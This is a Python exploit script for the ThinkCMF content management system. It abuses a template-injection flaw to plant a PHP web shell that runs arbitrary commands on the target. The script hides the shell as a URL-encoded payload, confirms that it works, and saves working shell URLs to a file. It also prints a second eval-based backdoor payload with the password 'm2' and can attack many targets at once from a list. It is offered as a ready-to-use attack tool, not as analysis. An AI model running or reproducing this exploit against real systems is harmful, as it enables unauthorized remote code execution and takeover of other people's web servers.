import urllib3
import requests,sys,json
from argparse import ArgumentParser
from time import time
from urllib import parse
import threadpool

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]
t = open('shell.txt','w')

def ThinkCMF_getshell(url):
	vuln_url = url + R'''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('92379705dac844c0.php','%3c%3f%70%68%70%0d%0a%65%63%68%6f%20%6d%64%35%28%22%54%68%69%6e%6b%43%4d%46%22%29%3b%0d%0a%20%20%20%20%69%66%28%69%73%73%65%74%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%29%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%63%6d%64%20%3d%20%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%73%79%73%74%65%6d%28%24%63%6d%64%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%2f%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%64%69%65%3b%0d%0a%20%20%20%20%7d%0d%0a%70%68%70%69%6e%66%6f%28%29%3b%0d%0a%3f%3e')</php>'''
	r = requests.get(vuln_url,timeout=15,verify=False)
	response_str = json.dumps(r.headers.__dict__['_store'])
	# print(response_str)   #响应头
	if r.status_code == 200 and 'PHP' in response_str:
		print ("[+]" + str(r.headers.get('Server')))
		print ("[+]" + str(r.headers.get('X-Powered-By')))
		check_shell(url)
	else:
		print ("[-]%s :No Exit ThinkCMF Vuln" %url)

def check_shell(url):
	shell_url = url + '/92379705dac844c0.php'
	r = requests.get(shell_url,timeout=15,verify=False)
	if r.status_code == 200 and "92379705dac844c0" in r.text:
		print ("\033[32m[+]CMD Shell url:\033[0m")
		print ("\033[32m[+]%s/92379705dac844c0.php?cmd=whoami\033[0m" %url)
		t.write("%s/92379705dac844c0.php?cmd=whoami\n" %url)
		print ("\033[32m[+]蚁剑无文件连接url:\033[0m")
		shell2_url=url + R'''index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=%3C?php%20@eval($_POST[%27m2%27]);?%3E'''
		print ("\033[32m[+]%s\033[0m" %shell2_url)
		print ("\033[32m[+]pass: m2\033[0m")
	else:
		print ("[-]%s :No Exit ThinkCMF Vuln" %url)


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(ThinkCMF_getshell, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()

if __name__ == '__main__':
	show = r'''

	 _____ _     _       _    _____ ___  _________                            
	|_   _| |   (_)     | |  /  __ \|  \/  ||  ___|                           
	  | | | |__  _ _ __ | | _| /  \/| .  . || |_               _____  ___ __  
	  | | | '_ \| | '_ \| |/ / |    | |\/| ||  _|             / _ \ \/ / '_ \ 
	  | | | | | | | | | |   <| \__/\| |  | || |              |  __/>  <| |_) |
	  \_/ |_| |_|_|_| |_|_|\_\\____/\_|  |_/\_|               \___/_/\_\ .__/ 
	                                                 ______            | |    
	                                                |______|           |_|    
	                 
					 		getshell_exp by m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='ThinkCMF_getshell_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		url=parse.urlparse(url)
		url=url.scheme + '://' + url.netloc
		ThinkCMF_getshell(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url=parse.urlparse(i)
			url=url.scheme + '://' + url.netloc
			url_list.append(url)
		multithreading(url_list,10)
	end=time()
	t.close()
	print('任务完成，用时%d' %(end-start))

